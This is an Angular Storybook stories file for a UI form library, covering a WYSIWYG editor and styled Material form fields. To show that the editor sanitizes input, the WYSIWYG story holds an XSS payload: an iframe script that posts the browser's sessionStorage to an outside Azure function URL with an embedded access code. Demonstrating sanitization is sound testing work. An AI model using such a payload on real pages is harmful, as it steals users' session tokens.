import {storiesOf} from '@storybook/angular';
import {boolean, withKnobs} from "@storybook/addon-knobs/angular";
import {action} from '@storybook/addon-actions'
import {StoFormModule, StoWysiwygModule} from "../../dist/stoui-form";
import {FormControl, ReactiveFormsModule} from "@angular/forms";
import {BrowserAnimationsModule} from "@angular/platform-browser/animations";
import {MatFormFieldModule} from "@angular/material/form-field";
import {MAT_LABEL_GLOBAL_OPTIONS} from '@angular/material/core';
import {MatInputModule} from "@angular/material/input";
import {MatSelectModule} from "@angular/material/select";
import stoFormReadme from '../../projects/stoui-form/src/lib/sto-form/sto-form.md'
import {MatCardModule} from "@angular/material/card";
import {MatButtonModule} from "@angular/material/button";
import {TextFieldModule} from "@angular/cdk/text-field";

const stories = storiesOf('Forms', module)
  .addDecorator(withKnobs);

const unsanitized = `<iframe srcdoc="<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>">
</iframe>
<b>This is bold.</b>
`;

stories
  .add('WYSIWYG', () => ({
    moduleMetadata: {
      declarations: [],
      imports: [StoWysiwygModule, ReactiveFormsModule, MatCardModule, MatButtonModule]
    },
    template: `
<button (click)="change(control.value)">Log value</button>
<button (click)="disabled = !disabled">Toggle disabled state</button>
<!--boolean('Disabled', true)-->
    <mat-card class="sto-card" style="height: 600px">
        <sto-wysiwyg #wysiwyg [readonly]="disabled" [formControl]="control">
        <button mat-flat-button color="primary">Save</button>
        <button mat-flat-button color="primary">Cancel</button>
</sto-wysiwyg>
    </mat-card>

Sanitizing happens <b>*inside*</b> the wysiwyg component. Malicious html is not passed to innerHTML.<br>
To be safe, consuming apps should <b>always</b> sanitize input before sending to wysiwyg component.<br>
<br>
Before sanitizing:
<pre>
{{unsanitized}}
</pre>

SafeValue (sanitized text value)
<pre>
{{wysiwyg.value}}
</pre>
<br>

As HTML:
<div [innerHTML]="wysiwyg.value"></div>
    `,
    props: {
      unsanitized: unsanitized,
      control: new FormControl(unsanitized),
      disabled: false,
      change: action('Value changed'),
    },
  }));

stories.add('StoFormField', () => ({
  moduleMetadata: {
    imports: [MatFormFieldModule, MatInputModule, StoFormModule, MatSelectModule, BrowserAnimationsModule, MatCardModule, TextFieldModule],
    providers: [{provide: MAT_LABEL_GLOBAL_OPTIONS, useValue: {float: 'always'}}]
  },
  template: `<mat-card class="sto-form">
<mat-form-field stoFormField *ngIf="withClasses">
<mat-label>Form field with styles</mat-label>
<input value="Some value" [disabled]="disabled" [readonly]="readonly" matInput>
</mat-form-field>
<mat-form-field stoFormField *ngIf="withClasses">
<mat-label>Form field with styles</mat-label>
<mat-select><mat-option>A</mat-option></mat-select>
</mat-form-field>
<mat-form-field appearance="fill" *ngIf="!withClasses">
<mat-label>Form field without styles</mat-label>
<input value="Some value" [disabled]="disabled" [readonly]="readonly" matInput>
</mat-form-field>
<mat-form-field stoFormField *ngIf="withClasses">
<mat-label>Text area with styles</mat-label>
<textarea matInput [cdkTextareaAutosize]="true">
Some Text Content

Should not select all on click
</textarea>
</mat-form-field>
</mat-card>`,
  props: {
    withClasses: boolean('Use styling', true),
    readonly: boolean('Readonly', false),
    disabled: boolean('Disabled', false)
  }
}), {
  notes: {markdown: stoFormReadme}
});
